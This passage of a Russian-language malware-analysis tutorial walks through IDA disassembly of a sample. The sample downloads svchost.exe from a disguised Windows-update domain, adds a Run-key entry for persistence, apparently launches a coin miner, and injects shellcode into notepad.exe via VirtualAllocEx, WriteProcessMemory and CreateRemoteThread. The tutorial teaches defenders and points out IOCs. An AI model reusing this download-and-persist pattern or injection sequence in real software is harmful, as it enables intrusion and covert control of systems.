            mov     [rsp+7A8h+dwFlags], 80000000h       ; dwFlags
            xor     r9d, r9d                            ; dwHeadersLength
            xor     r8d, r8d                            ; lpszHeaders
            mov     [rsp+7A8h+dwContext], 0             ; dwContext
            mov     r12, rax
            lea     rdx, szUrl                          ; "http://ms-windows-update.com/svchost.ex"...
            mov     rcx, rax                            ; hInternet
            call    cs:InternetOpenUrlA
            mov     r13, rax
            test    rax, rax
            jnz     short loc_40301E
        
        В последующих инструкциях мы находим вызов функции sub_403220
        Мы можем получить к ней доступ, дважды щелкнув по имени функции.

        //////////////////
        /// sub_403220 ///
        //////////////////

            sub_403220 proc near

            var_10= qword ptr -10h
            ArgList= byte ptr  20h

            sub     rsp, 38h
            lea     r8, aWindowsUpdate7                 ; "Windows-Update/7.6.7600.256 %s"
            mov     edx, 104h                           ; BufferCount
            mov     qword ptr [rsp+38h+ArgList], r9
            lea     r9, [rsp+38h+ArgList]               ; ArgList
            mov     [rsp+38h+var_10], r9
            call    j__vsnprintf
            add     rsp, 38h
            retn
            sub_403220 endp

        Данная функция форматирует строку, содержащую пользовательское значение user-agent, со строкой Windows-Update/7.6.7600.256 %s.
        Заполнитель %s заменяется на ранее полученное имя компьютера, которое передается этой функции в регистре rcx.
        Теперь полное значение читается как Windows-Update/7.6.7600.256 HOSTNAME, где HOSTNAME — это результат GetComputerNameA (имя компьютера).

        Крайне важно отметить этот уникальный пользовательский агент, в котором имя хоста также передается в запросе, когда вредоносная программа инициирует сетевое соединение.

        //////////////////
        /// sub_402F40 ///
        //////////////////

        Возвращаясь к предыдущей функции, находим функцию InternetOpenA (call    cs:InternetOpenA) 
        Она создает сеанс доступа в Интернет и настраиваеи параметры для функции InternetOpenUrlA (call    cs:InternetOpenUrlA)
        
        Затем она переходит к вызову инструкции (lea     rdx, szUrl      ; "http://ms-windows-update.com/svchost.ex"...) позволяющей открыть URL http://ms-windows-update.com/svchost.exe.

        *** Возможный IOC:
            Запомните этот URL http[:]//ms-windows-update[.]com/svchost[.]exe как потенциальный IOC.
            Вредоносная программа загружает дополнительный исполняемый файл из этого расположения.

        Если URL открывается успешно, код переходит к метке loc_40301E.
        Давайте проверим инструкции в loc_40301E, дважды щелкнув по нему.
    
        //////////////////
        /// loc_40301E ///
        //////////////////

            loc_40301E:                                     ; lpSecurityAttributes
            xor     r9d, r9d
            xor     r8d, r8d                                ; dwShareMode
            mov     edx, 40000000h                          ; dwDesiredAccess
            mov     rcx, r15                                ; lpFileName
            mov     [rsp+7A8h+hTemplateFile], 0             ; hTemplateFile
            mov     dword ptr [rsp+7A8h+dwContext], 80h     ; dwFlagsAndAttributes
            mov     [rsp+7A8h+dwFlags], 2                   ; dwCreationDisposition
            call    cs:CreateFileA
            mov     r14, rax
            cmp     rax, 0FFFFFFFFFFFFFFFFh
            jnz     short loc_403065
        
        При открытии функции мы наблюдаем вызов функции Windows API CreateFileA (call    cs:CreateFileA), которая используется для генерации файла в локальной системе, обозначая ранее полученный путь к файлу.

        Затем код входит в цикл (jnz     short loc_403065), многократно вызывая функцию InternetReadFile (loc_403065) для извлечения данных из открытого URL http[:]//ms-windows-update[.]com/svchost[.]exe.
        Если операция чтения данных оказывается успешной, код переходит к записи полученных данных в созданный файл (svchost.exe, расположенный в каталоге TEMP) с помощью функции WriteFile.

        *** Обратите внимание на эту уникальную технику, когда вредоносная программа загружает и помещает исполняемый файл svchost.exe во временный каталог.

        После операции записи данных код возвращается к чтению дополнительных данных, пока функция InternetReadFile не вернет значение, указывающее на конец потока данных.
        После того, как все данные будут прочитаны и записаны, открытый файл и интернет-дескрипторы закрываются с помощью соответствующих функций (CloseHandle и InternetCloseHandle).
        
        Затем код переходит к loc_4030D3, где вызывает функцию sub_403190

        //////////////////
        /// loc_4030D3 ///
        //////////////////

            loc_4030D3:             ; hObject
            mov     rcx, r14
            call    cs:CloseHandle
            mov     rcx, r13        ; hInternet
            mov     r13, cs:InternetCloseHandle
            call    r13 ; InternetCloseHandle
            mov     rcx, r12        ; hInternet
            call    r13 ; InternetCloseHandle
            mov     rcx, r15        ; lpFile
            call    sub_403190
            nop

        //////////////////
        /// sub_403190 ///
        //////////////////

            ; __int64 __fastcall sub_403190(LPCSTR lpFile)
            sub_403190 proc near

            phkResult= qword ptr -38h
            cbData= dword ptr -30h
            hKey= qword ptr -20h

            push    r12
            push    rdi
            push    rbx
            sub     rsp, 40h
            xor     eax, eax
            xor     r8d, r8d        ; ulOptions
            mov     r9d, 2          ; samDesired
            lea     rdx, SubKey     ; "SOFTWARE\\Microsoft\\Windows\\CurrentVe"...
            mov     r12, rcx
            or      rcx, 0FFFFFFFFFFFFFFFFh
            mov     rdi, r12
            repne scasb
            lea     rax, [rsp+58h+hKey]
            mov     [rsp+58h+phkResult], rax ; phkResult
            not     rcx
            lea     rbx, [rcx-1]
            mov     rcx, 0FFFFFFFF80000001h ; hKey
            call    cs:RegOpenKeyExA
            test    eax, eax
            jnz     short loc_403212
        
        Функция sub_403190 открывает серию вызовов WINAPI, связанных с изменениями реестра, такими как RegOpenKeyExA (call    cs:RegOpenKeyExA) и RegSetValueExA (call    cs:RegSetValueExA)

        Похоже, что функция помещает файл (svchost.exe, расположенный в каталоге TEMP) в раздел реестра SOFTWARE\Microsoft\Windows\CurrentVersion\Run с именем значения WindowsUpdater, а затем запечатывает раздел реестра.
        Этот прием часто используется как вредоносными программами, так и легитимными приложениями для сохранения своего контроля над системой при перезагрузках, обеспечивая автоматическую работу каждый раз при запуске системы или входе пользователя в систему.
        Мы взяли на себя смелость переименовать эту функцию в IDA в persistence_registry ради ясности.

        *** Возможный IOC:
            Выделите этот метод, при котором вредоносная программа изменяет реестр для достижения устойчивости.
            Она делает это, добавляя запись для svchost.exe под именем WindowsUpdater в разделе реестра SOFTWARE\Microsoft\Windows\CurrentVersion\Run.

            После создания реестра она инициирует другую функцию (call    sub_403150), которая приводит в действие сброшенный файл svchost.exe и направляет в него аргумент.
            Элементарный поиск Google предполагает, что этот аргумент потенциально может быть адресом кошелька Bitcoin.
            Таким образом, разумно предположить, что сброшенный исполняемый файл может быть майнером монет.

        Возвращаясь назад и систематически проверяя функции, мы можем определить любые остаточные функции, которые мы еще не исследовали.
        Клавиша Esc или кнопка Jump Back на панели инструментов облегчают это обратное отслеживание

        После трассировки проанализированного кода мы достигли этого блока, где подпрограмма sub_402D20 ожидает анализа.
        Давайте дважды щелкнем, чтобы открыть ее и посмотреть, что внутри.

        //////////////////
        /// sub_402D20 ///
        //////////////////

            sub_402D20 proc near

            bInheritHandles= dword ptr -2A8h
            dwCreationFlags= dword ptr -2A0h
            lpEnvironment= qword ptr -298h
            lpCurrentDirectory= qword ptr -290h
            lpStartupInfo= qword ptr -288h
            lpProcessInformation= qword ptr -280h
            ProcessInformation= _PROCESS_INFORMATION ptr -278h
            StartupInfo= _STARTUPINFOA ptr -260h
            Buffer= byte ptr -1F5h

            push    r12
            push    rdi
            push    rsi
            push    rbx
            sub     rsp, 2A8h
            xor     eax, eax
            mov     ecx, 1Ah
            lea     rsi, unk_405057
            xor     r9d, r9d                                ; lpThreadAttributes
            xor     r8d, r8d                                ; lpProcessAttributes
            lea     rdx, CommandLine                        ; "C:\\Windows\\System32\\notepad.exe"
            lea     rdi, [rsp+2C8h+StartupInfo]
            rep stosd
            lea     rdi, [rsp+2C8h+ProcessInformation]
            mov     ecx, 6
            mov     [rsp+2C8h+StartupInfo.cb], 68h          ; 'h'
            rep stosd
            lea     rax, [rsp+2C8h+ProcessInformation]
            lea     rdi, [rsp+2C8h+Buffer]
            mov     ecx, 1CDh                               ; lpApplicationName
            rep movsb
            mov     [rsp+2C8h+lpProcessInformation], rax    ; lpProcessInformation
            lea     rax, [rsp+2C8h+StartupInfo]
            mov     [rsp+2C8h+lpStartupInfo], rax           ; lpStartupInfo
            mov     [rsp+2C8h+lpCurrentDirectory], 0        ; lpCurrentDirectory
            mov     [rsp+2C8h+lpEnvironment], 0             ; lpEnvironment
            mov     [rsp+2C8h+dwCreationFlags], 4           ; dwCreationFlags
            mov     [rsp+2C8h+bInheritHandles], 0           ; bInheritHandles
            call    cs:CreateProcessA
            test    eax, eax
            jz      loc_402E89
        
        При открытии подпрограммы становится ясно, что она настраивает необходимые параметры для функции CreateProcessA, чтобы сгенерировать новый процесс.
        Затем она приступает к запуску нового процесса, notepad.exe, расположенного в каталоге C:\Windows\System32.

        Вот синтаксис функции CreateProcessA

            BOOL CreateProcessA(
                [in, optional]      LPCSTR                lpApplicationName,
                [in, out, optional] LPSTR                 lpCommandLine,
                [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
                [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
                [in]                BOOL                  bInheritHandles,
                [in]                DWORD                 dwCreationFlags,
                [in, optional]      LPVOID                lpEnvironment,
                [in, optional]      LPCSTR                lpCurrentDirectory,
                [in]                LPSTARTUPINFOA        lpStartupInfo,
                [out]               LPPROCESS_INFORMATION lpProcessInformation
            );
        
        Наблюдая за rdx в коде (lea     rdx, CommandLine    ; "C:\\Windows\\System32\\notepad.exe"), мы видим, что второй аргумент этой функции обозначен как C:\\Windows\\System32\\notepad.exe
        Мы отмечаем в документации функции CreateProcessA, что ненулевое возвращаемое значение указывает на успешное выполнение функции.
        Следовательно, в случае успеха она не перейдет к loc_402E89, а продолжит выполнение следующего блока инструкций

            mov     r8d, [rsp+2C8h+ProcessInformation.dwProcessId] ; dwProcessId
            xor     edx, edx        ; bInheritHandle
            mov     ecx, 1F0FFFh    ; dwDesiredAccess
            call    cs:OpenProcess
            mov     [rsp+2C8h+bInheritHandles], 40h ; '@' ; flProtect
            mov     r9d, 3000h      ; flAllocationType
            xor     edx, edx        ; lpAddress
            mov     r12, rax
            mov     r8d, 1CDh       ; dwSize
            mov     rcx, rax        ; hProcess
            call    cs:VirtualAllocEx
            mov     rbx, rax
            test    rax, rax
            jz      short loc_402E5F
        
        Последующий блок инструкций намекает на обычный тип внедрения процесса, при котором шелл-код вставляется в недавно созданный процесс с использованием функций VirtualAllocEx, WriteProcessMemory и CreateRemoteThread.

            mov     r9d, 1CDh       ; nSize
            lea     r8, [rsp+2C8h+Buffer] ; lpBuffer
            mov     rdx, rax        ; lpBaseAddress
            mov     rcx, r12        ; hProcess
            mov     qword ptr [rsp+2C8h+bInheritHandles], 0 ; lpNumberOfBytesWritten
            call    cs:WriteProcessMemory
            xor     r8d, r8d        ; dwStackSize
            xor     edx, edx        ; lpThreadAttributes
            mov     r9, rbx         ; lpStartAddress
            mov     [rsp+2C8h+lpEnvironment], 0 ; lpThreadId
            mov     rcx, r12        ; hProcess
            mov     [rsp+2C8h+dwCreationFlags], 0 ; dwCreationFlags
            mov     qword ptr [rsp+2C8h+bInheritHandles], 0 ; lpParameter
            call    cs:CreateRemoteThread
            test    rax, rax
            jz      short loc_402E5F

        Давайте расшифруем внедрение процесса на основе наших наблюдений за кодом.

            -   Новый процесс notepad.exe создается с помощью функции CreateProcessA.
            
            -   После этого в этом процессе выделяется память с помощью VirtualAllocEx.
            
            -   Затем шелл-код вписывается в выделенную память удаленного процесса notepad.exe с помощью функции WINAPI WriteProcessMemory.
            
            -   Наконец, в notepad.exe создается удаленный поток, инициирующий выполнение шелл-кода с помощью функции CreateRemoteThread.

        Если внедрение прошло успешно, появляется окно сообщения, объявляющее Connection, отправленное в C2.

            xor     r9d, r9d        ; uType
            lea     r8, Caption     ; "Message"
            lea     rdx, aConnectionSent ; "Connection sent to C2"
            xor     ecx, ecx        ; hWnd
            call    cs:MessageBoxA
            jmp     short loc_402E73

        И наоборот, в случае сбоя появляется сообщение об ошибке.

            loc_402E5F:
            call    cs:GetLastError
            lea     rcx, aErrorCodeIsLu ; "[-] Error code is : %lu\n"
            mov     edx, eax
            call    printf
        
        Для простоты переименуем функцию sub_402D20 в process_Injection.

        В начале этой функции мы можем заметить неизвестный адрес unk_405057 (lea     rsi, unk_405057), эффективный адрес которого загружается в регистр rsi с помощью инструкции lea rsi, unk_405057.
        Выполняемая до вызова функций WINAPI для инъекции процесса, причина загрузки эффективного адреса в rsi может быть разнообразной — он может функционировать как указатель доступа к данным или как аргумент вызова функции.
        Однако существует вероятность, что этот адрес содержит потенциальный шеллкод.
        Мы можем проверить это при отладке этих функций WINAPI с помощью отладчика, например x64dbg.

        Проанализировав и переименовав эту функцию внедрения процесса, мы продолжим возвращаться к предыдущим функциям, чтобы убедиться, что ни одна функция не была упущена.

    +++++++++++++++++++++++++++++++++
    + Visualizes the Execution Flow +
    +++++++++++++++++++++++++++++++++

    IDA также предлагает функцию, которая визуализирует поток выполнения между функциями в исполняемом файле с помощью графика потока вызовов.
    Этот мощный визуальный инструмент помогает аналитикам в навигации и понимании потока управления и взаимодействия между функциями.

    Вот как создать и изучить график, чтобы определить связи между различными функциями:

        i)      Switch to the disassembly view.
        ii)     Найдите View menu в верхней части интерфейса IDA.
        iii)    Наведите указатель мыши на опцию Graphs.
        iv)     В подменю выберите Function calls.
    
    Затем IDA создаст график потока вызовов функций для всех функций в двоичном файле и представит его в новом окне.
    Этот график предлагает обзор вызовов, сделанных между различными функциями в программе, что позволяет нам тщательно изучить поток управления и зависимости между функциями.

    В отличие от просмотра графика взаимосвязи для всех вызовов функций, мы также можем сосредоточиться на определенных функциях.
    Чтобы создать график ссылок для потока вызовов функций, связанных с определенной функцией, можно выполнить следующие шаги.

        a)  Перейдите к функции, график потока вызовов функций которой мы хотим изучить.
        b)  Чтобы открыть функцию в disassembly view, дважды щелкните имя функции или нажмите Enter.
        c)  В disassembly view щелкните правой кнопкой мыши в любом месте и выберите "Xrefs graph to...." или "Xrefs graph from..." в зависимости от того, хотим ли мы наблюдать вызовы функций, выполненные выбранной функцией, или вызовы функций, ведущие к выбранной функции.
        d)  IDA создаст график потока function calls и отобразит его в новом окне.

    Забегая вперед, мы углубимся в отладку в следующем разделе.
    Там мы запустим исполняемый файл в отладчике и установим точки останова на требуемых инструкциях и выберем критические функции WINAPI.
    Эта стратегия позволяет нам понимать и управлять потоком выполнения в реальном времени по мере работы программы.
    